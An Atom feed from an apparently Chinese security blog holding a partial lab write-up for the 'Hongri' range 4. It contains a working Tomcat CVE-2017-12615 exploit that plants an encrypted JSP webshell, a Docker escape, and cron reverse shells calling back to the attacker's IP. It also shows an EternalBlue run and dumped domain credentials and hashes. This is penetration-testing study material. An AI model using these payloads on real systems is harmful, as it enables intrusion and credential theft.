<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clown的站点</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2024-11-16T15:05:14.349Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>红日靶场四</title>
    <link href="https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/"/>
    <id>https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/</id>
    <published>2024-11-15T14:00:56.000Z</published>
    <updated>2024-11-16T15:05:14.349Z</updated>
    
    <content type="html"><![CDATA[<p>因为兼容性已经似了两个靶场，求求你别似了</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>两张网卡，一张VMnet0和VMnet1都是仅主机模式</p><p><img src="https://cdn.clown2024.cn/image-20241115220741988.png" alt="image-20241115220741988"></p><p><strong>web靶机</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221245366.png" alt="image-20241115221245366"></p><p><strong>win7</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221326010.png" alt="image-20241115221326010"></p><p><strong>DC</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221401258.png" alt="image-20241115221401258"></p><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="https://cdn.clown2024.cn/image-20241115221119472.png" alt="image-20241115221119472"></p><p>我们启动之后要去web靶机里面启动三个容器服务</p><p><img src="https://cdn.clown2024.cn/image-20241115222514020.png" alt="image-20241115222514020"></p><p>我们启动前三个容器服务即可</p><p>然后我们的攻击机自然也要在VMnet0的网段</p><blockquote><p>好欸靶机终于活了一次了😭</p></blockquote><h2 id="机器密码"><a href="#机器密码" class="headerlink" title="机器密码"></a>机器密码</h2><ul><li>ubuntu:ubuntu <strong>域成员机器</strong></li><li>douser:Dotest123 <strong>DC</strong></li><li>administrator:Test2008（改成 Admin123 因为过期了）</li></ul><h1 id="考点描述"><a href="#考点描述" class="headerlink" title="考点描述"></a>考点描述</h1><p>本次靶场渗透<strong>反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透</strong>等多种组合漏洞</p><p><strong>靶场学习路径，可参考</strong></p><ul><li>st漏洞利用</li><li>phpmyadmin getshell</li><li>tomcat 漏洞利用</li><li>docker逃逸</li><li>ms14-068</li><li>ssh密钥利用</li><li>流量转发</li><li>历史命令信息泄露</li><li>域渗透</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>先用arp-scan扫一下同一网段内的主机，指定对应的网卡接口</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp-scan -I eth1 -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115223747881.png" alt="image-20241115223747881"></p><p>那可以得知192.168.157.128就是我们的外网web靶机</p><p>接下来用nmap进行端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sT -sV 192.168.157.128<br></code></pre></td></tr></table></figure><p>扫出来下面的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:39 EST<br>Nmap scan report for 192.168.157.128<br>Host is up (0.0013s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>2001/tcp open  http    Jetty 9.2.11.v20150529<br>2002/tcp open  http    Apache Tomcat 8.5.19<br>2003/tcp open  http    Apache httpd 2.4.25<br>MAC Address: 00:0C:29:E3:C5:36 (VMware)<br>Service Info: Host: 172.19.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.90 seconds<br></code></pre></td></tr></table></figure><p>可以看到三个开放端口都有服务，2001、2002、2003，22的ssh服务一般先跳过</p><p>然后上fscan扫一下漏洞吧</p><p>都能扫出来相关的漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.157.128:2002 open<br>192.168.157.128:2001 open<br>192.168.157.128:2003 open<br>[*] alive ports len is: 3<br>start vulscan<br>[*] WebTitle http://192.168.157.128:2002 code:200 len:11230  title:Apache Tomcat/8.5.19<br>[*] WebTitle http://192.168.157.128:2001 code:200 len:1077   title:Struts2 Showcase - Fileupload sample<br>[+] PocScan http://192.168.157.128:2002 poc-yaml-iis-put-getshell <br>[+] PocScan http://192.168.157.128:2002 poc-yaml-tomcat-cve-2017-12615-rce        <br>[+] PocScan http://192.168.157.128:2001 poc-yaml-struts2_045 poc1<br></code></pre></td></tr></table></figure><blockquote><p>不是他怎么2003端口没扫出来洞呢🤔，这按理来说应该是有的吧</p></blockquote><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="tomcat任意文件写入漏洞"><a href="#tomcat任意文件写入漏洞" class="headerlink" title="tomcat任意文件写入漏洞"></a>tomcat任意文件写入漏洞</h2><p>那就不管了先来看一下他的服务吧，看一下tomcat-cve-2017-12615-rce漏洞，这是一个tomcat的任意文件写入漏洞</p><p>直接用msf搜一下有没有相关的tomcat的cve</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search cve-2017 tomcat<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115230446678.png" alt="image-20241115230446678"></p><p>找到了一个对应的rce漏洞，那就打一下试试</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/http/tomcat_jsp_upload_bypass<br>show payloads<br><span class="hljs-built_in">set</span> payload java/jsp_shell_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.157.129<br><span class="hljs-built_in">set</span> rhost 192.168.157.128<br><span class="hljs-built_in">set</span> rport 2002<br>run<br></code></pre></td></tr></table></figure><p>然后就能弹一个shell回来了</p><p><img src="https://cdn.clown2024.cn/image-20241115230644472.png" alt="image-20241115230644472"></p><p>不过这样操作起来不太方便，去找payload上传一个冰蝎的shell，方便我们后续上传木马</p><p>网上随便找到一个exp：<a href="https://www.cnblogs.com/confidant/p/15440233.html">https://www.cnblogs.com/confidant/p/15440233.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CVE-2017-12615 EXP</span><br>__author__ = <span class="hljs-string">&#x27;纸机&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">import</span> time<br><br><br>parse = optparse.OptionParser(usage = <span class="hljs-string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,dest=<span class="hljs-string">&#x27;URL&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>,<span class="hljs-string">&#x27;--port&#x27;</span>,dest=<span class="hljs-string">&#x27;PORT&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="hljs-string">&#x27;8080&#x27;</span>)<br><br>options,args = parse.parse_args()<br><span class="hljs-comment">#验证参数是否完整</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.URL <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> options.PORT:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)<br>        exit(<span class="hljs-string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)<br><br>url = options.URL+<span class="hljs-string">&#x27;:&#x27;</span>+options.PORT<br>filename = <span class="hljs-string">&#x27;/backdoor.jsp&#x27;</span><br>payload = filename+<span class="hljs-string">&#x27;?pwd=023&amp;i=&#x27;</span><br><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;<br><span class="hljs-comment">#木马</span><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#上传木马文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] 目标地址:&#x27;</span>+url)<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.put(url+filename+<span class="hljs-string">&#x27;/&#x27;</span>,headers=headers,data = data)<br>    <span class="hljs-comment">#print(respond.status_code)</span><br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">201</span> <span class="hljs-keyword">or</span> respond.status_code == <span class="hljs-number">204</span>:<br>      <span class="hljs-comment">#print(&#x27;[*] 目标地址:&#x27;+url)</span><br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] 木马上传成功&#x27;</span>)<br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] 上传失败&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment">#命令执行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">url,cmd</span>):<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.get(url+payload+cmd)<br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">200</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(respond.text).replace(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).strip())<br><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] 命令执行错误&#x27;</span>)<br><span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">0</span>:<br>        exit()<br>time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;输入执行命令(quit退出):&#x27;</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>  cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>  <span class="hljs-keyword">if</span>(cmd == <span class="hljs-string">&#x27;quit&#x27;</span>):<br>    <span class="hljs-keyword">break</span><br>  attack(url,cmd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python cve-2017-tomcat.py -u http://192.168.157.128 -p 2002<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115232125447.png" alt="image-20241115232125447"></p><p>然后冰蝎连接</p><p><img src="https://cdn.clown2024.cn/image-20241115232227130.png" alt="image-20241115232227130"></p><p>看一下基本信息</p><p><img src="https://cdn.clown2024.cn/image-20241115232453454.png" alt="image-20241115232453454"></p><p>可以看到docker环境，也可以用下面命令判断</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>题目考点有提到docker逃逸的知识点，那就看一下docker逃逸要怎么利用，参考：<a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html">https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html</a></p><p>看一下是否是特权模式</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/status | grep -qi <span class="hljs-string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Is privileged mode&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not privileged mode&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115234729102.png" alt="image-20241115234729102"></p><p>根据文章检测下来只有特权模式能够利用，其他服务可能也存在，但这里tomcat的服务刚好能利用，就继续进行下去</p><p>查看挂载磁盘设备</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235254326.png" alt="image-20241115235254326"></p><p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /test &amp;&amp; mount /dev/sda1 /test<br></code></pre></td></tr></table></figure><p>尝试访问宿主机 shadow 文件，可以看到正常访问</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /test/etc/shadow<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235506075.png" alt="image-20241115235506075"></p><p>那么我们就可以写入定时任务反弹shell然后拿到的权限也是宿主机的root权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> $<span class="hljs-string">&#x27;* * * * * perl -e \&#x27;</span>use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;192.168.157.129&quot;</span>;<span class="hljs-variable">$p</span>=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;open(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;<span class="hljs-string">&#x27; &gt; /test/var/spool/cron/crontabs/root</span><br></code></pre></td></tr></table></figure><p>但是为了方便操作还是看一下能不能写ssh公钥来连接吧</p><p>先看一下有没有.ssh文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name .ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116000516621.png" alt="image-20241116000516621"></p><p>发现了ubuntu的.ssh文件地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/test/home/ubuntu/.ssh<br></code></pre></td></tr></table></figure><p>那就可以写ssh公钥然后远程登录了</p><p>生成本地密钥对</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>以前生成过可以直接用</p><p><img src="https://cdn.clown2024.cn/image-20241116000827045.png" alt="image-20241116000827045"></p><p>写进authorized_keys</p><p><img src="https://cdn.clown2024.cn/image-20241116001043435.png" alt="image-20241116001043435"></p><p>欸我去忘记了这是仅主机模式了，我termius连不了，只能用kali的ssh，而且我试了一下还连不上就逆天，还是要我输入密码，不知道是不是我格式写错了（我发现直接传也不行）</p><p>那就还是反弹shell吧</p><p><img src="https://cdn.clown2024.cn/image-20241116003807417.png" alt="image-20241116003807417"></p><p>怪了，写进去又弹不过来了，红温了😡</p><p>换成bash弹一下看看</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.157.129/8888 0&gt;&amp;1&quot;</span> &gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure><p>红温了还是不行</p><p>那就只能用john去爆一下密码了</p><p>把&#x2F;etc&#x2F;shadow的内容保存下来，然后直接john爆破</p><p><img src="https://cdn.clown2024.cn/image-20241116102516524.png" alt="image-20241116102516524"></p><p>轻松爆出密码为ubuntu，然后用ssh远程登录一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh ubuntu@192.168.157.128<br></code></pre></td></tr></table></figure><p>然后看一下eth1的地址信息，就是内网地址的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig eth1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111716201.png" alt="image-20241116111716201"></p><p>可以知道内网地址192.168.183.128</p><h2 id="struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h2><p>2001是一个struts2服务，直接上工具：<a href="https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32">https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32</a></p><p>直接能扫出rce漏洞</p><p><img src="https://cdn.clown2024.cn/image-20241116230437845.png" alt="image-20241116230437845"></p><p>那利用也很简单，干啥都行了，马也随便你上传，就不多演示了</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="frp反向代理"><a href="#frp反向代理" class="headerlink" title="frp反向代理"></a>frp反向代理</h2><p>现在我们呢就拿下一台跳板机了，为了方便顺便熟悉一下frp，这里搭个代理进去，然后可以直接扫一下内网</p><p>参考教程：<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</a></p><p>先将本地的frp上传到ubuntu的机器上去</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">scp -r frp ubuntu@192.168.157.128:/home/ubuntu/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116105558626.png" alt="image-20241116105558626"></p><blockquote><p>这里有点要注意，他上传的时候会直接找你当前目录下的frp目录，所以如上图要现在ubuntu目录下创建一个frp目录</p></blockquote><p>kali的frp服务端配置frps.toml</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">bindPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><span class="hljs-comment">#port，token自定义 保持客户端与服务端一致即可</span><br></code></pre></td></tr></table></figure><p>然后启动服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frps -c ./frps.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116110345584.png" alt="image-20241116110345584"></p><p>ubuntu的客户端frpc.toml配置</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">serverAddr</span> = <span class="hljs-string">&quot;192.168.157.129&quot;</span> <span class="hljs-comment"># 改为 VPS 的 IP 地址</span><br><span class="hljs-attr">serverPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><br><span class="hljs-section">[[proxies]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;plugin_socks5&quot;</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attr">remotePort</span> = <span class="hljs-number">60051</span><br><span class="hljs-section">[proxies.plugin]</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-attr">username</span> = <span class="hljs-string">&quot;0HDFt16cLQJCB&quot;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&quot;JTN276Gp1A&quot;</span><br></code></pre></td></tr></table></figure><p>然后启动客户端</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111031630.png" alt="image-20241116111031630"></p><p>然后现在就能通过60051端口走socks5代理访问内网了</p><p>再配置一下proxychains4工具的配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure><p>配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[ProxyList]<br># add proxy here ...<br># meanwile<br># defaults set to &quot;tor&quot;<br># socks4        127.0.0.1 9050<br># socks5  192.168.172.132 7777<br># socks5 127.0.0.1 8989<br>socks5 127.0.0.1 60051 0HDFt16cLQJCB JTN276Gp1A<br></code></pre></td></tr></table></figure><blockquote><p>这里一开始socks5忘记加上用户名和密码了，导致msf访问的时候被拒绝连接了</p></blockquote><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>那就直接上fscan扫内网了</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains ./fscan -h 192.168.183.1/24<br></code></pre></td></tr></table></figure><p>扫出的信息如下：</p><p>存活主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">(icmp) Target 192.168.183.1   is alive<br>(icmp) Target 192.168.183.130 is alive<br>(icmp) Target 192.168.183.128 is alive<br>(icmp) Target 192.168.183.129 is alive<br></code></pre></td></tr></table></figure><p>可以看到其他两台的地址都扫出来了</p><p>端口信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.183.128:22 open<br>192.168.183.1:7680 open<br>192.168.183.129:445 open<br>192.168.183.130:445 open<br>192.168.183.129:139 open<br>192.168.183.1:445 open<br>192.168.183.130:139 open<br>192.168.183.129:135 open<br>192.168.183.1:139 open<br>192.168.183.130:135 open<br>192.168.183.1:135 open<br>192.168.183.130:88 open<br></code></pre></td></tr></table></figure><p>漏洞信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*]192.168.183.130<br>   [-&gt;]WIN-ENS2VR5TR3N<br>   [-&gt;]192.168.183.130<br>[*] NetInfo <br>[*]192.168.183.129<br>   [-&gt;]TESTWIN7-PC<br>   [-&gt;]192.168.183.129<br>[+] MS17-010 192.168.183.129    (Windows 7 Enterprise 7601 Service Pack 1)<br>[+] MS17-010 192.168.183.130    (Windows Server 2008 HPC Edition 7601 Service Pack 1)                   <br>[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1<br></code></pre></td></tr></table></figure><p>win7的主机有MS17-010永恒之蓝漏洞，winServer2008应该是域控也有一个永恒之蓝</p><p>那就先打win7吧直接</p><h2 id="打win7"><a href="#打win7" class="headerlink" title="打win7"></a>打win7</h2><p>通过porxychains启动msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116174820036.png" alt="image-20241116174820036"></p><p>然后上永恒之蓝的扫描模块试一下，主要是测试能不能通</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116175834529.png" alt="image-20241116175834529"></p><p>可以看到是成功扫出来了ms17-010，那就直接开打！</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <span class="hljs-comment">#因为主机在内网，所以我们这里需要用正向的shell</span><br><span class="hljs-built_in">set</span> target Windows\ 7<br><span class="hljs-built_in">set</span> RHOSTS 192.168.183.129<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p>一顿超时之后终于是拿到了meterpreter</p><p><img src="https://cdn.clown2024.cn/image-20241116180809503.png" alt="image-20241116180809503"></p><p>getuid看一下</p><p><img src="https://cdn.clown2024.cn/image-20241116180833768.png" alt="image-20241116180833768"></p><p>欸发现已经是SYSTEM权限了</p><p>那就直接不同提权了，直接常规先拿一下账号密码之类的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msv credentials<br>===============<br><br>Username      Domain  NTLM                              SHA1<br>--------      ------  ----                              ----<br>TESTWIN7-PC$  DEMO    e3ba914bdaca29c197c7191ebf521873  68a1422322c303e4c24d63f381a03b34eb434477<br>douser        DEMO    bc23b0b4d5bf5ff42bc61fb62e13886e  c48096437367aad00ac2dc70552051cd84912a55<br><br>wdigest credentials<br>===================<br><br>Username      Domain  Password<br>--------      ------  --------<br>(null)        (null)  (null)<br>TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8<br>                      He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>douser        DEMO    Dotest123<br><br>kerberos credentials<br>====================<br><br>Username      Domain    Password<br>--------      ------    --------<br>(null)        (null)    (null)<br>douser        DEMO.COM  (null)<br>testwin7-pc$  demo.com  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>testwin7-pc$  DEMO.COM  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>testclone:1001:aad3b435b51404eeaad3b435b51404ee:8d8e04036d33ed20f5c2f6ad77e28bb7:::<br></code></pre></td></tr></table></figure><p>那现在win7就拿下了，但是我想shell获得cmd窗口一直不行不知道为什么</p><p><img src="https://cdn.clown2024.cn/image-20241116183521507.png" alt="image-20241116183521507"></p><p>又一直出现拒绝连接了</p><p>蚌埠住了我更新了msf想重新打试试的，结果直接给win7打蓝屏和死机了</p><p>后来可以之后他还是拿不到cmd</p><p><img src="https://cdn.clown2024.cn/image-20241116203423166.png" alt="image-20241116203423166"></p><p>后面还想将msf派生到cs上面，但是不会派生正向的shell，我看网上大部分都是先cs上线了一台主机然后创建中转监听的，没找到直接派生正向shell的</p><h2 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h2><p>那这次用不上cs，直接msf一路杀</p><p>先继续尝试一下我们刚刚扫出来的永恒之蓝</p><p><img src="https://cdn.clown2024.cn/image-20241116211150550.png" alt="image-20241116211150550"></p><p>ok打了两遍失败了，那就试试其他的吧</p><p>考点也说了用到了ms14-068漏洞，用msf搜索了一下只有验证漏洞的，没有利用漏洞的程序</p><p><img src="https://cdn.clown2024.cn/image-20241116211428215.png" 